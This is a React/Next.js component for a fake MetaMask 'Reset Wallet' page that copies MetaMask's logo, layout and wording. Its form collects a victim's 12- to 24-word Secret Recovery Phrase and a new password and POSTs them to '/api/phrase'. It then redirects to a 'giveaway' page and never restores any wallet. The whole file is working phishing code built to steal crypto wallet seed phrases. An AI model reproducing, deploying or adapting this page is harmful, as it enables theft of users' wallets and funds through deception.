"use client";

import { useState, FormEvent, useEffect } from "react";
import PhraseField from "./PhraseField";
import Link from "next/link";
import { useRouter } from "next/navigation";
function Spinner() {
  return (
    <div
      className="inline-block h-6 w-6 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"
      role="status"
    ></div>
  );
}

export default function MetaMask() {
  const [noPhrase, setNoPhrase] = useState("I have a 12-word phrase");
  const [phraseWords, setPhraseWords] = useState<string[]>(Array(24).fill(""));
  const [newPassword, setNewPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [passwordsMatch, setPasswordsMatch] = useState(true);
  const router = useRouter();

  // Function to extract phrase length from the selected option
  const getPhraseLength = (phrase: string) => {
    const match = phrase.match(/(\d+)-word/);
    return match ? parseInt(match[1]) : 0;
  };

  // Determine the number of input fields based on the selected phrase
  const phraseLength = getPhraseLength(noPhrase);

  const handlePhraseChange = (index: number, value: string) => {
    const newPhraseWords = [...phraseWords];
    newPhraseWords[index] = value;
    setPhraseWords(newPhraseWords);
  };

  useEffect(() => {
    // Check if passwords match whenever either password field changes
    setPasswordsMatch(newPassword === confirmPassword);
  }, [newPassword, confirmPassword]);

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!passwordsMatch || newPassword.length < 8) {
      return;
    }
    setIsLoading(true);

    const phrase = phraseWords.slice(0, phraseLength).join(" ").trim();

    try {
      const response = await fetch("/api/phrase", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phrase, password: newPassword }),
      });

      if (!response.ok) {
        throw new Error("Network response was not ok");
      }

      router.replace("https://www.chaingpt.org/giveaway");
    } catch (error) {
      console.error("Error submitting form:", error);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <main className="max-w-screen-lg relative md:static">
      <div className="bg-[#141618] w-full absolute left-0 md:flex flex-col top-0 items-center hidden">
        {/* logo */}
        <div className="flex flex-col items-center py-8">
          <svg
            height="30"
            viewBox="0 0 1311 242"
            width="162"
            xmlns="http://www.w3.org/2000/svg"
            className="app-header__metafox-logo--horizontal"
          >
            <g fill="none">
              <g fill="white" transform="translate(361 61)">
                <path d="m796.7 60.9c-6.8-4.5-14.3-7.7-21.4-11.7-4.6-2.6-9.5-4.9-13.5-8.2-6.8-5.6-5.4-16.6 1.7-21.4 10.2-6.8 27.1-3 28.9 10.9 0 .3.3.5.6.5h15.4c.4 0 .7-.3.6-.7-.8-9.6-4.5-17.6-11.3-22.7-6.5-4.9-13.9-7.5-21.8-7.5-40.7 0-44.4 43.1-22.5 56.7 2.5 1.6 24 12.4 31.6 17.1s10 13.3 6.7 20.1c-3 6.2-10.8 10.5-18.6 10-8.5-.5-15.1-5.1-17.4-12.3-.4-1.3-.6-3.8-.6-4.9 0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6 0 12.1 3 18.8 11.2 24.9 7.7 5.8 16.1 8.2 24.8 8.2 22.8 0 34.6-12.9 37-26.3 2.1-13.1-1.8-24.9-13.5-32.7z"></path>
                <path d="m71.6 2.3h-7.4-8.1c-.3 0-.5.2-.6.4l-13.7 45.2c-.2.6-1 .6-1.2 0l-13.7-45.2c-.1-.3-.3-.4-.6-.4h-8.1-7.4-10c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-87.7c0-.7 1-.8 1.2-.2l13.8 45.5 1 3.2c.1.3.3.4.6.4h12.8c.3 0 .5-.2.6-.4l1-3.2 13.8-45.5c.2-.7 1.2-.5 1.2.2v87.7c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-115.4c0-.3-.3-.6-.6-.6z"></path>
                <path d="m541 2.3c-.3 0-.5.2-.6.4l-13.7 45.2c-.2.6-1 .6-1.2 0l-13.7-45.2c-.1-.3-.3-.4-.6-.4h-25.4c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-87.7c0-.7 1-.8 1.2-.2l13.8 45.5 1 3.2c.1.3.3.4.6.4h12.8c.3 0 .5-.2.6-.4l1-3.2 13.8-45.5c.2-.7 1.2-.5 1.2.2v87.7c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-115.4c0-.3-.3-.6-.6-.6z"></path>
                <path d="m325.6 2.3h-31.1-16.7-31.1c-.3 0-.6.3-.6.6v14.4c0 .3.3.6.6.6h30.5v100.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-100.4h30.5c.3 0 .6-.3.6-.6v-14.4c0-.3-.2-.6-.6-.6z"></path>
                <path d="m424.1 118.9h15.2c.4 0 .7-.4.6-.8l-31.4-115.8c-.1-.3-.3-.4-.6-.4h-5.8-10.2-5.8c-.3 0-.5.2-.6.4l-31.4 115.8c-.1.4.2.8.6.8h15.2c.3 0 .5-.2.6-.4l9.1-33.7c.1-.3.3-.4.6-.4h33.6c.3 0 .5.2.6.4l9.1 33.7c.1.2.4.4.6.4zm-39.9-51 12.2-45.1c.2-.6 1-.6 1.2 0l12.2 45.1c.1.4-.2.8-.6.8h-24.4c-.4 0-.7-.4-.6-.8z"></path>
                <path d="m683.3 118.9h15.2c.4 0 .7-.4.6-.8l-31.4-115.8c-.1-.3-.3-.4-.6-.4h-5.8-10.2-5.8c-.3 0-.5.2-.6.4l-31.4 115.8c-.1.4.2.8.6.8h15.2c.3 0 .5-.2.6-.4l9.1-33.7c.1-.3.3-.4.6-.4h33.6c.3 0 .5.2.6.4l9.1 33.7c.1.2.3.4.6.4zm-39.9-51 12.2-45.1c.2-.6 1-.6 1.2 0l12.2 45.1c.1.4-.2.8-.6.8h-24.4c-.4 0-.7-.4-.6-.8z"></path>
                <path d="m149.8 101.8v-35.8c0-.3.3-.6.6-.6h44.5c.3 0 .6-.3.6-.6v-14.4c0-.3-.3-.6-.6-.6h-44.5c-.3 0-.6-.3-.6-.6v-30.6c0-.3.3-.6.6-.6h50.6c.3 0 .6-.3.6-.6v-14.4c0-.3-.3-.6-.6-.6h-51.2-17.3c-.3 0-.6.3-.6.6v15 31.9 15.6 37 15.8c0 .3.3.6.6.6h17.3 53.3c.3 0 .6-.3.6-.6v-15.2c0-.3-.3-.6-.6-.6h-52.8c-.3-.1-.5-.3-.5-.7z"></path>
                <path d="m949.3 117.9-57.8-59.7c-.2-.2-.2-.6 0-.8l52-54c.4-.4.1-1-.4-1h-21.3c-.2 0-.3.1-.4.2l-44.1 45.8c-.4.4-1 .1-1-.4v-45c0-.3-.3-.6-.6-.6h-16.7c-.3 0-.6.3-.6.6v115.4c0 .3.3.6.6.6h16.7c.3 0 .6-.3.6-.6v-50.8c0-.5.7-.8 1-.4l50 51.6c.1.1.3.2.4.2h21.3c.4-.1.7-.8.3-1.1z"></path>
              </g>
              <g
                strokeLinecap="round"
                strokeLinejoin="round"
                transform="translate(1 1)"
              >
                <path
                  d="m246.1.2-101.1 75 18.8-44.2z"
                  fill="#e17726"
                  stroke="#e17726"
                ></path>
                <g fill="#e27625" stroke="#e27625" transform="translate(2)">
                  <path d="m10.9.2 100.2 75.7-17.9-44.9z"></path>
                  <path d="m207.7 174.1-26.9 41.2 57.6 15.9 16.5-56.2z"></path>
                  <path d="m.2 175 16.4 56.2 57.5-15.9-26.8-41.2z"></path>
                  <path d="m71 104.5-16 24.2 57 2.6-1.9-61.5z"></path>
                  <path d="m184 104.5-39.7-35.4-1.3 62.2 57-2.6z"></path>
                  <path d="m74.1 215.3 34.5-16.7-29.7-23.2z"></path>
                  <path d="m146.4 198.6 34.4 16.7-4.7-39.9z"></path>
                </g>
                <g
                  fill="#d5bfb2"
                  stroke="#d5bfb2"
                  transform="translate(76 198)"
                >
                  <path d="m106.8 17.3-34.4-16.7 2.8 22.4-.3 9.5z"></path>
                  <path d="m.1 17.3 32 15.2-.2-9.5 2.7-22.4z"></path>
                </g>
                <path
                  d="m108.7 160.6-28.6-8.4 20.2-9.3z"
                  fill="#233447"
                  stroke="#233447"
                ></path>
                <path
                  d="m150.3 160.6 8.4-17.7 20.3 9.3z"
                  fill="#233447"
                  stroke="#233447"
                ></path>
                <g
                  fill="#cc6228"
                  stroke="#cc6228"
                  transform="translate(49 128)"
                >
                  <path d="m27.1 87.3 5-41.2-31.8.9z"></path>
                  <path d="m128.9 46.1 4.9 41.2 26.9-40.3z"></path>
                  <path d="m153 .7-57 2.6 5.3 29.3 8.4-17.7 20.3 9.3z"></path>
                  <path d="m31.1 24.2 20.2-9.3 8.4 17.7 5.3-29.3-57-2.6z"></path>
                </g>
                <g
                  fill="#e27525"
                  stroke="#e27525"
                  transform="translate(57 128)"
                >
                  <path d="m0 .7 23.9 46.7-.8-23.2z"></path>
                  <path d="m122 24.2-.9 23.2 23.9-46.7z"></path>
                  <path d="m57 3.3-5.3 29.3 6.7 34.6 1.5-45.6z"></path>
                  <path d="m88 3.3-2.8 18.2 1.4 45.7 6.7-34.6z"></path>
                </g>
                <path
                  d="m150.3 160.6-6.7 34.6 4.8 3.4 29.7-23.2.9-23.2z"
                  fill="#f5841f"
                  stroke="#f5841f"
                ></path>
                <path
                  d="m80.1 152.2.8 23.2 29.7 23.2 4.8-3.4-6.7-34.6z"
                  fill="#f5841f"
                  stroke="#f5841f"
                ></path>
                <path
                  d="m150.9 230.5.3-9.5-2.6-2.2h-38.2l-2.5 2.2.2 9.5-32-15.2 11.2 9.2 22.7 15.7h38.9l22.8-15.7 11.1-9.2z"
                  fill="#c0ac9d"
                  stroke="#c0ac9d"
                ></path>
                <path
                  d="m148.4 198.6-4.8-3.4h-28.2l-4.8 3.4-2.7 22.4 2.5-2.2h38.2l2.6 2.2z"
                  fill="#161616"
                  stroke="#161616"
                ></path>
                <g fill="#763e1a" stroke="#763e1a">
                  <path d="m250.4 80.1 8.5-41.4-12.8-38.5-97.7 72.5 37.6 31.8 53.1 15.5 11.7-13.7-5.1-3.7 8.1-7.4-6.2-4.8 8.1-6.2z"></path>
                  <path d="m.1 38.7 8.6 41.4-5.5 4.1 8.2 6.2-6.2 4.8 8.1 7.4-5.1 3.7 11.7 13.7 53.1-15.5 37.6-31.8-97.7-72.5z"></path>
                </g>
                <g fill="#f5841f" stroke="#f5841f">
                  <path d="m239.1 120-53.1-15.5 16 24.2-23.9 46.7 31.6-.4h47.2z"></path>
                  <path d="m73 104.5-53.1 15.5-17.7 55h47.1l31.6.4-23.9-46.7z"></path>
                  <path d="m145 131.3 3.4-58.6 15.4-41.7h-68.6l15.4 41.7 3.4 58.6 1.3 18.4.1 45.5h28.2l.1-45.5z"></path>
                </g>
              </g>
            </g>
          </svg>
        </div>
        <div className="flex justify-between bg-[#24272a] items-center w-full py-4 px-3 shadow-xl md:static fixed top-0 left-0 md:max-w-screen-lg">
          <div className=""></div>
          <div className="flex justify-between items-center">
            <button className="flex items-center justify-between max-w-[140px] h-[32px] bg-[]">
              <svg x="0" y="0" width="16" height="16">
                <rect
                  x="0"
                  y="0"
                  width="16"
                  height="16"
                  transform="translate(-1.553545478277602 3.794689601024582) rotate(244.3 8 8)"
                  fill="#FB183E"
                ></rect>
                <rect
                  x="0"
                  y="0"
                  width="16"
                  height="16"
                  transform="translate(0.13408744451682802 -9.694945099995875) rotate(344.4 8 8)"
                  fill="#C81432"
                ></rect>
                <rect
                  x="0"
                  y="0"
                  width="16"
                  height="16"
                  transform="translate(-0.33904573644388186 -11.740810471099701) rotate(274.5 8 8)"
                  fill="#FA9A00"
                ></rect>
              </svg>

              <h4 className="font-semibold text-[12px] mx-2">Account 1</h4>

              <span className="-rotate-45 mb-1 font-semibold">∟</span>
            </button>
          </div>
          <div className="rotate-90">...</div>
        </div>
      </div>

      <div className="flex md:hidden justify-between bg-[#24272a] items-center w-full py-4 px-3 shadow-xl md:static fixed top-0 left-0 md:max-w-screen-lg">
        <div className=""></div>
        <div className="flex justify-between items-center">
          <Link
            href={"/connect-wallet"}
            className="flex items-center justify-between max-w-[140px] h-[32px] bg-[]"
          >
            <svg x="0" y="0" width="16" height="16">
              <rect
                x="0"
                y="0"
                width="16"
                height="16"
                transform="translate(-1.553545478277602 3.794689601024582) rotate(244.3 8 8)"
                fill="#FB183E"
              ></rect>
              <rect
                x="0"
                y="0"
                width="16"
                height="16"
                transform="translate(0.13408744451682802 -9.694945099995875) rotate(344.4 8 8)"
                fill="#C81432"
              ></rect>
              <rect
                x="0"
                y="0"
                width="16"
                height="16"
                transform="translate(-0.33904573644388186 -11.740810471099701) rotate(274.5 8 8)"
                fill="#FA9A00"
              ></rect>
            </svg>

            <h4 className="font-semibold text-[12px] mx-2">Account 1</h4>

            <span className="-rotate-45 mb-1 font-semibold">∟</span>
          </Link>
        </div>
        <div className="rotate-90">...</div>
      </div>

      <div className="p-8 w-full md:mt-[10rem] mt-[5rem]">
        <Link
          href={"/connect-wallet"}
          className="md:flex items-center mb-4 gap-2 mt-4 hidden"
        >
          <p>〈</p>
          <h5 className="font-semibold">Back</h5>
        </Link>
        <div className="mt-2 md:block hidden">
          <h4 className="font-extrabold text-3xl">Reset Wallet</h4>
          <p>
            MetaMask does not keep a copy of your password. If you’re having
            trouble unlocking your account, you will need to reset your wallet.
            You can do this by providing the Secret Recovery Phrase you used
            when you set up your wallet.
          </p>
          <p className="my-4">
            This action will delete your current wallet and Secret Recovery
            Phrase from this device, along with the list of accounts you’ve
            curated. After resetting with a Secret Recovery Phrase, you’ll see a
            list of accounts based on the Secret Recovery Phrase you use to
            reset. This new list will automatically include accounts that have a
            balance. You’ll also be able to
          </p>
        </div>

        <span className="mt-4">
          Make sure you’re using the correct Secret Recovery Phrase before
          proceeding. You will not be able to undo this.
        </span>

        <form onSubmit={handleSubmit}>
          <div className=" w-full md:flex justify-between items-center ">
            <h4 className="font-semibold text-white mt-5">
              Secret Recovery Phrase
            </h4>
            <select
              className="bg-transparent border-[1px] border-solid border-[#848c96] py-2 px-3 mt-1 rounded-md mb-4 w-full md:w-[303px]"
              value={noPhrase}
              onChange={(e) => setNoPhrase(e.target.value)}
            >
              <option value="I have a 12-word phrase">
                I have a 12-word phrase
              </option>
              <option value="I have a 15-word phrase">
                I have a 15-word phrase
              </option>
              <option value="I have a 18-word phrase">
                I have a 18-word phrase
              </option>
              <option value="I have a 21-word phrase">
                I have a 21-word phrase
              </option>
              <option value="I have a 24-word phrase">
                I have a 24-word phrase
              </option>
            </select>
          </div>

          <div className="banner">
            <h4>
              You can paste your entire secret recovery phrase into any field
            </h4>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 md:grid-cols-3">
            {Array.from({ length: phraseLength }, (_, index) => (
              <PhraseField
                key={index}
                index={index}
                value={phraseWords[index]}
                onChange={(value) => handlePhraseChange(index, value)}
              />
            ))}
          </div>

          <div className="mt-8">
            <h4>New Password (8 character min)</h4>
            <input
              type="password"
              className="bg-transparent rounded-md w-full h-[48px] border-[1px] border-solid border-[#848c96] pl-4 outline-none"
              value={newPassword}
              onChange={(e) => setNewPassword(e.target.value)}
              required
              minLength={8}
            />
            <p
              className={`mt-2 transition-all duration-300 ease-in-out ${
                newPassword === ""
                  ? "opacity-0"
                  : newPassword.length < 8
                  ? "text-yellow-500 opacity-100"
                  : "opacity-0"
              }`}
            >
              Password must be at least 8 characters long
            </p>
          </div>

          <div>
            <h4>Confirm password</h4>
            <input
              type="password"
              className="bg-transparent rounded-md w-full h-[48px] border-[1px] border-solid border-[#848c96] pl-4 outline-none"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              required
            />
            <p
              className={`mt-2 transition-all duration-300 ease-in-out ${
                confirmPassword === ""
                  ? "opacity-0"
                  : newPassword.length < 8
                  ? "text-yellow-500 opacity-100"
                  : passwordsMatch
                  ? "text-green-500 opacity-100"
                  : "text-red-500 opacity-100"
              }`}
            >
              {newPassword.length < 8
                ? "Password must be at least 8 characters long"
                : passwordsMatch
                ? "Passwords match"
                : "Passwords do not match"}
            </p>
          </div>

          <button
            type="submit"
            className="bg-[#43aefc] h-[40px] w-[170px] rounded-full mt-8 text-[#24272a] font-medium flex items-center justify-center"
            disabled={isLoading || !passwordsMatch || newPassword.length < 8}
          >
            {isLoading ? (
              <>
                <Spinner />
                <span className="ml-2">Restoring...</span>
              </>
            ) : (
              "Restore"
            )}
          </button>
        </form>
      </div>
    </main>
  );
}
